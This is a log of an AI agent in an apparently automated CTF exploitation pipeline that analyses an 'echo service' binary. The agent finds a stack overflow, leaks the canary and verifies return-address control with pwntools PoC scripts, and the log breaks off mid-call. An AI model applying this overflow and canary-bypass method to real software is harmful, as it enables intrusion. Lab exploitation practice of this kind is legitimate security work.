19:08:10 === Full Run: S1 → S2 → S3（所有 bug） → S4 ===

19:08:10 --- S1 Recon ---
19:08:10 === recon (bug_id=-) ===
19:08:10 [recon] → 调用 GLM...
19:08:13 [recon] ← GLM(3.6s): 调工具[checksec, elf_info, identify_libc, ls]
19:08:13 [recon] I'll start by gathering basic binary info, security protections, and runtime environment in parallel.
19:08:13 [recon]   → 工具 checksec({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:08:13 [recon]   → 工具 elf_info({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:08:13 [recon]   → 工具 identify_libc({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:08:14 [recon]   → 工具 ls({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810"})
19:08:14 [recon]   ← ls(0.0s): ['/work/workspace/0009-2021-29-cooldown-20260905-190810/full_run.log', '/work/workspace/0009-2021-29-cooldown-20260905-190810/target']
19:08:14 [recon]   ← elf_info(0.0s): /work/workspace/0009-2021-29-cooldown-20260905-190810/target: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter...(3844 chars)
19:08:14 [recon]   ← identify_libc(0.1s): 	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x0000722ef9ca3000) ⏎ ===LIBC VERSION=== ⏎ GNU C Library (Ubuntu GLIBC 2.39-0ubuntu8.8) stable release ...(166 chars)
19:08:14 [recon]   ← checksec(0.4s): [*] '/work/workspace/0009-2021-29-cooldown-20260905-190810/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:     ...(246 chars)
19:08:14 [recon] → 调用 GLM...
19:08:18 [recon] ← GLM(4.1s): 调工具[sections, symbols, global_vars, got_plt, list_strings, cfg]
19:08:18 [recon] Now let me gather sections, symbols, global variables, GOT/PLT, strings, and CFG in parallel.
19:08:18 [recon]   → 工具 sections({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:08:18 [recon]   → 工具 symbols({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "max_lines": 100})
19:08:18 [recon]   → 工具 global_vars({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "max_lines": 60})
19:08:18 [recon]   → 工具 got_plt({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:08:18 [recon]   → 工具 list_strings({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "max_lines": 100})
19:08:18 [recon]   → 工具 cfg({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:08:18 [recon]   ← sections(0.0s): There are 30 section headers, starting at offset 0x3b40: ⏎  ⏎ Section Headers: ⏎   [Nr] Name              Type             Address           Offset ⏎ ...(4667 chars)
19:08:18 [recon]   ← got_plt(0.0s): [{"offset": "0000000000003de8", "type": "R_X86_64_RELATIVE", "value": "*ABS*+0x0000000000001190"}, {"offset": "0000000000003df0", "type": "R_X86_64_RE...(1709 chars)
19:08:18 [recon]   ← global_vars(0.0s):     12: 0000000000004060     8 OBJECT  GLOBAL DEFAULT   25 stdout@GLIBC_2.2.5 (2) ⏎     14: 0000000000004070     8 OBJECT  GLOBAL DEFAULT   25 stdin@G...(1209 chars)
19:08:18 [recon]   ← symbols(0.0s): 0000000000003df8 d _DYNAMIC ⏎ 0000000000004000 d _GLOBAL_OFFSET_TABLE_ ⏎ 0000000000002000 R _IO_stdin_used ⏎                  w _ITM_deregisterTMClone...(1645 chars)
19:08:18 [recon]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ n/DZ}G ⏎ mfUa ⏎ __isoc99_scanf ⏎ puts ⏎ __stack_chk_fail ⏎ stdin ⏎ printf ⏎ read ⏎ stdout ⏎ stderr ⏎ alarm ⏎ __cxa_final...(1509 chars)
19:08:20 [recon]   ← cfg(2.1s): [{"name": "_init", "addr": "0x401000", "blocks": 3, "calls": ["UnresolvableCallTarget"]}, {"name": "sub_401020", "addr": "0x401020", "blocks": 1, "cal...(3327 chars)
19:08:20 [recon] → 调用 GLM...
19:08:25 [recon] ← GLM(4.5s): 调工具[disassemble, disassemble, probe_io]
19:08:25 [recon] Now let me disassemble the key functions (init and main) and probe the I/O behavior.
19:08:25 [recon]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "init", "lines": 100})
19:08:25 [recon]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "main", "lines": 200})
19:08:25 [recon]   → 工具 probe_io({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "steps": "[{\"recv_until\": \"echo\", \"send\": \"AAAA\"}, {\"recv_until\":)
19:08:25 [recon]   ← disassemble(0.0s): 0000000000001200 <main>: ⏎     1200:	push   rbp ⏎     1201:	mov    rbp,rsp ⏎     1204:	add    rsp,0xffffffffffffff80 ⏎     1208:	mov    rax,QWORD PTR ...(1975 chars)
19:08:25 [recon]   ← disassemble(0.0s): 0000000000001195 <init>: ⏎     1195:	push   rbp ⏎     1196:	mov    rbp,rsp ⏎     1199:	mov    rax,QWORD PTR [rip+0x2ed0]        # 4070 <stdin@GLIBC_2....(879 chars)
19:08:28 [recon]   ← probe_io(3.4s): RECV: b'Welcome to echo' ⏎ SEND: 'AAAA' ⏎ RECV: b' service.\nAAAA\nEnd?' ⏎ SEND: 'N' ⏎ RECV: b'' ⏎ SEND: 'BBBB' ⏎ RECV: b'[Y/N] BBBB\nEnd?' ⏎ SEND: 'Y...(174 chars)
19:08:28 [recon] → 调用 GLM...
19:08:31 [recon] ← GLM(3.2s): 调工具[execute, read_file, elf_plt_got]
19:08:31 [recon] Let me check the RPATH/RUNPATH and verify the rodata strings, and also check the full_run.log for any additional context.
19:08:31 [recon]   → 工具 execute({"command": "readelf -d /work/workspace/0009-2021-29-cooldown-20260905-190810/target | grep -iE 'path|needed|rpath|runpath'"})
19:08:31 [recon]   → 工具 read_file({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/full_run.log"})
19:08:31 [recon]   → 工具 elf_plt_got({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "symbols": "main,init,puts,printf,read,scanf,alarm,setvbuf,__stack_chk_fail)
19:08:31 [recon]   ← execute(0.0s):  0x0000000000000001 (NEEDED)             Shared library: [libc.so.6] ⏎  ⏎ [Command succeeded with exit code 0]
19:08:31 [recon]   ← read_file(0.0s):  1  19:08:10 === Full Run: S1 → S2 → S3（所有 bug） → S4 === ⏎  2   ⏎  3  19:08:10 --- S1 Recon --- ⏎  4  19:08:10 === recon (bug_id=-) === ⏎  5  19:08:10...(6349 chars)
19:08:31 [recon]   ← elf_plt_got(0.0s): {"plt": {"puts": "0x1030", "printf": "0x1050", "read": "0x1070", "alarm": "0x1060", "setvbuf": "0x1080", "__stack_chk_fail": "0x1040"}, "got": {"puts"...(445 chars)
19:08:31 [recon] → 调用 GLM...
19:08:38 [recon] ← GLM(6.4s): 调工具[execute]
19:08:38 [recon] I now have all the information needed. Let me analyze the key findings:  **Key observations from main disassembly:** - `main` allocates a stack buffer
19:08:38 [recon]   → 工具 execute({"command": "xxd /work/workspace/0009-2021-29-cooldown-20260905-190810/target | grep -A2 '00002000:'"})
19:08:38 [recon]   ← execute(0.0s): 00002000: 0100 0200 5765 6c63 6f6d 6520 746f 2065  ....Welcome to e ⏎ 00002010: 6368 6f20 7365 7276 6963 652e 0025 7300  cho service..%s. ⏎ 00002020: ...(249 chars)
19:08:38 [recon] → 调用 GLM...
19:09:41 [recon] ← GLM(63.2s): 调工具[submit_final_result]
19:09:41 [recon] Now I have all the facts. The rodata confirms: - `0x2004`: "Welcome to echo service." - `0x201d`: "%s" (printf format for echo) - `0x2020`: "End?[Y/N]
19:09:41 [recon] ✓ submit_final_result 收到最终报告（ReconReport 校验通过，12666 chars）
19:09:41 [recon] → 调用 GLM...
19:09:48 [recon] ← GLM(6.9s)
19:09:48 [recon] S1 侦察已完成并提交。以下是关键发现摘要：  ## 侦察结果摘要  **二进制基本信息：** ELF64 x86-64 PIE，动态链接，未 strip，源文件 `cooldown.c`，GCC 10.2.0 编译。  **安全保护：** Partial RELRO、NX 启用、Canary 启用
19:09:48 [stage1] 保存 → /work/workspace/0009-2021-29-cooldown-20260905-190810/stage1.json
19:09:48 --- S2 Semantic ---
19:09:48 === semantic (bug_id=-) ===
19:09:48 [semantic] → 调用 GLM...
19:09:51 [semantic] ← GLM(2.6s): 调工具[disassemble, disassemble]
19:09:51 [semantic] I'll analyze the binary by disassembling the main function to verify the S1 facts and trace the data flow precisely.
19:09:51 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "main", "lines": 200})
19:09:51 [semantic]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "init", "lines": 50})
19:09:51 [semantic]   ← disassemble(0.0s): 0000000000001200 <main>: ⏎     1200:	push   rbp ⏎     1201:	mov    rbp,rsp ⏎     1204:	add    rsp,0xffffffffffffff80 ⏎     1208:	mov    rax,QWORD PTR ...(1975 chars)
19:09:51 [semantic]   ← disassemble(0.0s): 0000000000001195 <init>: ⏎     1195:	push   rbp ⏎     1196:	mov    rbp,rsp ⏎     1199:	mov    rax,QWORD PTR [rip+0x2ed0]        # 4070 <stdin@GLIBC_2....(879 chars)
19:09:51 [semantic] → 调用 GLM...
19:10:02 [semantic] ← GLM(11.2s): 调工具[read_file]
19:10:02 [semantic] The disassembly confirms the S1 facts. Let me now analyze the key vulnerability points in detail.  Let me verify the exact stack layout and the critic
19:10:02 [semantic]   → 工具 read_file({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "limit": 1, "offset": 0})
19:10:02 [semantic]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0009-2021-29-cooldown-20260905-190810/target': 'utf-8' codec can't decode byte 0xb0 in position 24: invalid...(161 chars)
19:10:02 [semantic] → 调用 GLM...
19:10:04 [semantic] ← GLM(1.6s): 调工具[list_strings]
19:10:04 [semantic] Let me verify the strings in the binary to confirm the format strings:
19:10:04 [semantic]   → 工具 list_strings({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:10:04 [semantic]   ← list_strings(0.0s): /lib64/ld-linux-x86-64.so.2 ⏎ n/DZ}G ⏎ mfUa ⏎ __isoc99_scanf ⏎ puts ⏎ __stack_chk_fail ⏎ stdin ⏎ printf ⏎ read ⏎ stdout ⏎ stderr ⏎ alarm ⏎ __cxa_final...(1048 chars)
19:10:04 [semantic] → 调用 GLM...
19:11:03 [semantic] ← GLM(59.8s): 调工具[submit_final_result]
19:11:03 [semantic] Now I have all the facts confirmed. Let me analyze the complete data flow for both vulnerabilities:  **BUG-001: Stack Buffer Overflow** - `read(0, rbp
19:11:03 [semantic] ✓ submit_final_result 收到最终报告（VulnerabilityReport 校验通过，11635 chars）
19:11:03 [semantic] → 调用 GLM...
19:11:09 [semantic] ← GLM(5.5s)
19:11:09 [semantic] S2 语义漏洞分析已完成。我识别出两个高严重性漏洞：  **BUG-001: 栈缓冲区溢出 (STACK_BUFFER_OVERFLOW)** - `read(0, rbp-0x70, 0x100)` 将最多 256 字节读入仅 112 字节的栈缓冲区 - 溢出 144 字节，覆盖 canary（偏
19:11:09 [stage2] 保存 → /work/workspace/0009-2021-29-cooldown-20260905-190810/stage2.json
19:11:09 --- S3 Primitive（所有 bug） ---
19:11:09 === impact (bug_id=BUG-001) ===
19:11:09 [impact:BUG-001] → 调用 GLM...
19:11:12 [impact:BUG-001] ← GLM(3.2s): 调工具[disassemble, checksec]
19:11:12 [impact:BUG-001] 我将分析 BUG-001 (STACK_BUFFER_OVERFLOW) 并推导其原语。让我先检查一下二进制文件和关键函数的反汇编代码。
19:11:12 [impact:BUG-001]   → 工具 disassemble({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "function": "main", "lines": 150})
19:11:12 [impact:BUG-001]   → 工具 checksec({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target"})
19:11:12 [impact:BUG-001]   ← disassemble(0.0s): 0000000000001200 <main>: ⏎     1200:	push   rbp ⏎     1201:	mov    rbp,rsp ⏎     1204:	add    rsp,0xffffffffffffff80 ⏎     1208:	mov    rax,QWORD PTR ...(1975 chars)
19:11:13 [impact:BUG-001]   ← checksec(0.4s): [*] '/work/workspace/0009-2021-29-cooldown-20260905-190810/target' ⏎     Arch:       amd64-64-little ⏎     RELRO:      Partial RELRO ⏎     Stack:     ...(246 chars)
19:11:13 [impact:BUG-001] → 调用 GLM...
19:11:17 [impact:BUG-001] ← GLM(4.7s): 调工具[probe_io]
19:11:17 [impact:BUG-001] 很好。反汇编结果确认了 BUG-001：`read(0, rbp-0x70, 0x100)` 将最多 256 字节的数据读入了一个 112 字节的缓冲区中。现在让我来验证栈布局，并确认溢出是否到达了 canary、saved rbp 和返回地址。让我探测一下 I/O 以了解菜单时序。
19:11:17 [impact:BUG-001]   → 工具 probe_io({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "steps": "[{\"recv_until\": \"echo service\", \"send\": \"AAAA\"}, {\"recv_)
19:11:21 [impact:BUG-001]   ← probe_io(3.3s): RECV: b'Welcome to echo service' ⏎ SEND: 'AAAA' ⏎ RECV: b'.\nAAAA\nEnd?' ⏎ SEND: 'N' ⏎ RECV: b'' ⏎ SEND: 'Y' ⏎ RECV_TAIL: b'[Y/N] '
19:11:21 [impact:BUG-001] → 调用 GLM...
19:11:25 [impact:BUG-001] ← GLM(4.5s): 调工具[gdb_run]
19:11:25 [impact:BUG-001] 很好，我已经理解了 I/O 时序。循环在 `continue_flag` 为 'Y' 或 'y' 时退出。现在让我验证一下栈布局，并确认溢出是否到达了 canary、saved rbp 和返回地址。我将使用 gdb 来检查栈帧。
19:11:25 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0x48; run; info registers rbp rsp; x/20gx $rbp-0x80; x)
19:11:25 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x1248 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ⏎ ...(997 chars)
19:11:25 [impact:BUG-001] → 调用 GLM...
19:11:31 [impact:BUG-001] ← GLM(5.9s): 调工具[make_payload]
19:11:31 [impact:BUG-001] 现在我已经确认了栈布局： - `rbp = 0x7fffffffeb70` - `buf` 从 `rbp-0x70 = 0x7fffffffeb00` 开始 - `canary` 位于 `rbp-0x8 = 0x7fffffffeb68` → 值 `0xc7bf6e4e04b81200`（注意 LS
19:11:31 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/payload_overflow_canary.bin", "parts": [["A", 120], ["\n", 1]]})
19:11:31 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0009-2021-29-cooldown-20260905-190810/payload_overflow_canary.bin len=121 preview_hex=414141414141414141414141414141414141414141414141...(166 chars)
19:11:31 [impact:BUG-001] → 调用 GLM...
19:11:34 [impact:BUG-001] ← GLM(2.4s): 调工具[gdb_run_crash]
19:11:34 [impact:BUG-001]   → 工具 gdb_run_crash({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "payload_file": "/work/workspace/0009-2021-29-cooldown-20260905-190810/payl)
19:12:34 [impact:BUG-001]   ← gdb_run_crash(60.3s): {"raw_tail": "(gdb timed out)"}
19:12:34 [impact:BUG-001] → 调用 GLM...
19:13:13 [impact:BUG-001] ← GLM(39.6s): 调工具[write_file]
19:13:14 [impact:BUG-001] 程序在等待更多输入（scanf 提示符）。我需要提供完整的交互序列。让我编写一个合适的 PoC 脚本，通过 pwntools 处理菜单交互。
19:13:14 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001 STACK_BUFFER_OVERFLOW - Primitive Verification PoC\n\nStack layout (from buf start at rbp-0x70):\)
19:13:14 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py
19:13:14 [impact:BUG-001] → 调用 GLM...
19:13:16 [impact:BUG-001] ← GLM(2.5s): 调工具[run_script]
19:13:16 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py", "timeout": 30})
19:13:46 [impact:BUG-001]   ← run_script(29.6s): rc=0 ⏎ --- stdout (summarized) --- ⏎ BUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification ⏎ Binary: /work/workspace/0009-2021-29-cooldown-20260905-...(1014 chars)
19:13:46 [impact:BUG-001] → 调用 GLM...
19:14:18 [impact:BUG-001] ← GLM(32.4s): 调工具[write_file]
19:14:18 [impact:BUG-001] Canary 泄露成功了（我们获取了 7 个 canary 字节）。但是 `p.wait()` 返回了 None —— 进程没有在超时时间内退出。问题在于 `send_overflow` 函数和 `p.wait()` 的处理逻辑。让我来修复一下时序问题 —— 问题很可能是因为 `p.send()` 
19:14:18 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001 STACK_BUFFER_OVERFLOW - Primitive Verification PoC\n\nStack layout (from buf start at rbp-0x70):\)
19:14:18 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py
19:14:18 [impact:BUG-001] → 调用 GLM...
19:14:20 [impact:BUG-001] ← GLM(2.4s): 调工具[run_script]
19:14:20 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py", "timeout": 40})
19:14:25 [impact:BUG-001]   ← run_script(4.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎ BUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification ⏎ Binary: /work/workspace/0009-2021-29-cooldown-20260905-...(924 chars)
19:14:25 [impact:BUG-001] → 调用 GLM...
19:14:30 [impact:BUG-001] ← GLM(4.8s): 调工具[gdb_run]
19:14:30 [impact:BUG-001] Canary 泄露再次成功，但 `p.wait()` 返回了 None。问题在于进程没有在超时时间内退出。让我用 gdb 调试一下，以了解发生了什么。问题可能在于 `p.wait()` 没有正确检测到退出。让我尝试另一种方法——使用 `p.poll()` 并检查崩溃信号。另外，让我用 gdb 验证一
19:14:30 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0xd7; run; echo \"BP hit at ret\"; info registers rip )
19:14:47 [impact:BUG-001]   ← gdb_run(16.6s): gdb timed out (15s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:14:47 [impact:BUG-001] → 调用 GLM...
19:14:54 [impact:BUG-001] ← GLM(7.6s): 调工具[gdb_run]
19:14:54 [impact:BUG-001] gdb 命令 `echo` 可能导致了问题。让我简化一下 gdb 命令。另外，stdin 需要正确驱动循环。让我更仔细地思考一下 stdin 的格式。  程序执行以下操作： 1. 打印 "Welcome to echo service." 2. 检查 continue_flag（初始为 'N'）->
19:14:54 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0xd7; run; info registers rip; x/4gx $rsp", "stdin": ")
19:15:04 [impact:BUG-001]   ← gdb_run(10.2s): gdb timed out (10s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:15:04 [impact:BUG-001] → 调用 GLM...
19:15:32 [impact:BUG-001] ← GLM(27.5s): 调工具[write_file]
19:15:32 [impact:BUG-001] `ret` 处的断点没有命中。问题在于 `read()` 读取了 `AAAA\nY\n`（所有 6 个字节），然后 `scanf` 就没有输入了，导致阻塞。我需要分开 `read` 和 `scanf` 的输入。使用管道时，`read()` 会读取所有可用数据。让我换个思路。  实际上，当通过管道输入
19:15:32 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001 STACK_BUFFER_OVERFLOW - Primitive Verification PoC\n\nStack layout (from buf start at rbp-0x70):\)
19:15:32 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py
19:15:32 [impact:BUG-001] → 调用 GLM...
19:15:34 [impact:BUG-001] ← GLM(2.4s): 调工具[run_script]
19:15:34 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py", "timeout": 45})
19:15:42 [impact:BUG-001]   ← run_script(7.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎ BUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification ⏎ Binary: /work/workspace/0009-2021-29-cooldown-20260905-...(1154 chars)
19:15:42 [impact:BUG-001] → 调用 GLM...
19:15:53 [impact:BUG-001] ← GLM(11.1s): 调工具[write_file]
19:15:53 [impact:BUG-001] 两个原语均已验证： - **PRIM-001 (STACK_CONTROL)**：Canary 覆盖 → `__stack_chk_fail` → SIGABRT (返回代码 -6) ✓ - **PRIM-002 (RIP_CONTROL)**：Canary 泄露绕过 + 返回地址覆盖为 0x414
19:15:53 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001 STACK_BUFFER_OVERFLOW - GDB verification of RIP_CONTROL\nConfirms that RIP is hijacked to 0x41414)
19:15:53 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py
19:15:53 [impact:BUG-001] → 调用 GLM...
19:15:56 [impact:BUG-001] ← GLM(3.2s): 调工具[run_script]
19:15:56 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py", "timeout": 30})
19:16:03 [impact:BUG-001]   ← run_script(6.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Leaked canary: 0x7d10bdcddb3ea600 ⏎ Target PID: 12972 ⏎ Return code: -11 ⏎ === PRIM-002 GDB: VERIFIED === ⏎ RIP h...(344 chars)
19:16:03 [impact:BUG-001] → 调用 GLM...
19:16:15 [impact:BUG-001] ← GLM(12.3s): 调工具[write_file]
19:16:15 [impact:BUG-001] 太棒了！PRIM-002 已确认：RIP 被劫持至 0x4141414141414141，导致 SIGSEGV。现在让我使用 gdb 验证实际的寄存器状态，以获取确切的 RIP 值。让我使用 gdb 直接运行二进制文件，并采用正确的输入序列。
19:16:15 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001 - GDB crash verification: capture RIP at crash point.\nRuns the binary under gdb, leaks canary, o)
19:16:15 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py
19:16:15 [impact:BUG-001] → 调用 GLM...
19:16:17 [impact:BUG-001] ← GLM(1.8s): 调工具[run_script]
19:16:17 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py", "timeout": 30})
19:16:23 [impact:BUG-001]   ← run_script(6.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ Leaked canary: 0x6db3dd30815f1000 ⏎ Return code: -11 ⏎ Signal: SIGSEGV (11) ⏎ === PRIM-002: VERIFIED === ⏎ RIP_CO...(394 chars)
19:16:23 [impact:BUG-001] → 调用 GLM...
19:16:40 [impact:BUG-001] ← GLM(16.9s): 调工具[write_file]
19:16:40 [impact:BUG-001] 现在让我使用 gdb 来捕获确切的崩溃寄存器状态，以证明 RIP == 0x4141414141414141。我将使用 gdb_run 工具，并配合一个能正确驱动程序的 stdin 序列。诀窍在于 read() 和 scanf() 都从 stdin 读取数据。让我使用一个能正确处理此问题的 gdb 
19:16:40 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001 - GDB crash register capture.\nUses gdb to run the binary, set breakpoint at ret instruction,\nan)
19:16:40 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py
19:16:40 [impact:BUG-001] → 调用 GLM...
19:16:44 [impact:BUG-001] ← GLM(3.4s): 调工具[run_script]
19:16:44 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001-gdb.py", "timeout": 45})
19:16:44 [impact:BUG-001]   ← run_script(0.3s): rc=1 ⏎ --- stdout (summarized) --- ⏎ [ERROR] gdbserver is not installed ⏎ --- stderr (summarized) --- ⏎ Traceback (most recent call last): ⏎   File "/...(1098 chars)
19:16:44 [impact:BUG-001] → 调用 GLM...
19:16:53 [impact:BUG-001] ← GLM(9.3s): 调工具[gdb_run]
19:16:53 [impact:BUG-001] gdbserver 不可用。让我改用 gdb_run 工具。诀窍在于构建正确的 stdin。问题在于 read() 和 scanf() 都从同一个 stdin 读取。让我换个角度思考。  使用 gdb_run 时，stdin 是通过管道传输的。程序执行以下操作： 1. read(0, buf, 0x
19:16:53 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b *main+0xd7; b __stack_chk_fail; run; info registers rip rsp )
19:17:04 [impact:BUG-001]   ← gdb_run(10.9s): gdb timed out (10s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:17:04 [impact:BUG-001] → 调用 GLM...
19:17:15 [impact:BUG-001] ← GLM(11.0s): 调工具[make_payload]
19:17:15 [impact:BUG-001] 程序卡住了。问题在于 `read()` 读取了所有 stdin（包括 `Y\n`），然后 `scanf` 就没有输入了。让我换个角度思考一下。  当 stdin 是管道时，`read(0, buf, 0x100)` 会读取管道中所有可用的字节。如果我发送 `payload\nY\n`，`read()
19:17:15 [impact:BUG-001]   → 工具 make_payload({"file_path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/payload_gdb_test.bin", "parts": [["B", 104], ["C", 8], ["D", 8], ["E", 8], ["F", )
19:17:15 [impact:BUG-001]   ← make_payload(0.0s): /work/workspace/0009-2021-29-cooldown-20260905-190810/payload_gdb_test.bin len=258 preview_hex=4242424242424242424242424242424242424242424242424242424...(159 chars)
19:17:15 [impact:BUG-001] → 调用 GLM...
19:17:20 [impact:BUG-001] ← GLM(4.4s): 调工具[gdb_run]
19:17:20 [impact:BUG-001] 等等，这总共是 256+2 = 258 字节。`read()` 会读取 256 字节（0x100），剩下的 "Y\n" 会留给 `scanf`。但是前 256 字节覆盖了 canary（偏移量 104 处的 'C' 字节），所以 `__stack_chk_fail` 会在 `ret` 之前触发。让我
19:17:20 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "commands": "b __stack_chk_fail; run; info registers rip rsp rbp; bt", "std)
19:17:31 [impact:BUG-001]   ← gdb_run(11.2s): gdb timed out (10s)。多半是程序 run 后阻塞——检查 stdin 是否提供了驱动程序到断点的输入序列；命令序列若含等待输入的交互命令也会卡。修改 commands/stdin 后重试，相同参数重调结果不变。
19:17:31 [impact:BUG-001] → 调用 GLM...
19:17:39 [impact:BUG-001] ← GLM(8.5s): 调工具[check_crash_log]
19:17:39 [impact:BUG-001] 仍然卡住。问题在于 `read()` 读取的字节数少于 256，因为 stdin 字符串被截断或存在编码问题。让我检查一下：stdin 是一个字符串，但 `read()` 读取的是原始字节。`gdb_run` 的 stdin 参数是文本，而不是二进制。256 字节的 'B' 字符可能无法正确传输。 
19:17:39 [impact:BUG-001]   → 工具 check_crash_log({"binary": "/work/workspace/0009-2021-29-cooldown-20260905-190810/target", "max_lines": 20})
19:17:39 [impact:BUG-001]   ← check_crash_log(0.0s): [76674.564048] coredump: 12937(target): Core dump to core.12937 aborted: cannot preserve file owner ⏎ [76678.848956] traps: target[20555] general prot...(2121 chars)
19:17:39 [impact:BUG-001] → 调用 GLM...
19:18:05 [impact:BUG-001] ← GLM(25.6s): 调工具[write_file]
19:18:05 [impact:BUG-001] 这是来自内核崩溃日志的关键证据！崩溃日志显示：  1. **`general protection fault ip:...2d7`** - IP 位于偏移量 `0x12d7`，即 `main+0xd7` = `ret` 指令！这证实了崩溃发生在 `ret` 指令处。 2. **`in target
19:18:05 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification PoC\n\nThis PoC verifies two primitives derived f)
19:18:05 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py
19:18:05 [impact:BUG-001] → 调用 GLM...
19:18:07 [impact:BUG-001] ← GLM(2.0s): 调工具[run_script]
19:18:07 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0009-2021-29-cooldown-20260905-190810/poc-BUG-001.py", "timeout": 45})
19:18:15 [impact:BUG-001]   ← run_script(7.7s): rc=0 ⏎ --- stdout (summarized) --- ⏎ BUG-001: STACK_BUFFER_OVERFLOW - Primitive Verification ⏎ Binary: /work/workspace/0009-2021-29-cooldown-20260905-...(1080 chars)
19:18:15 [impact:BUG-001] → 调用 GLM...
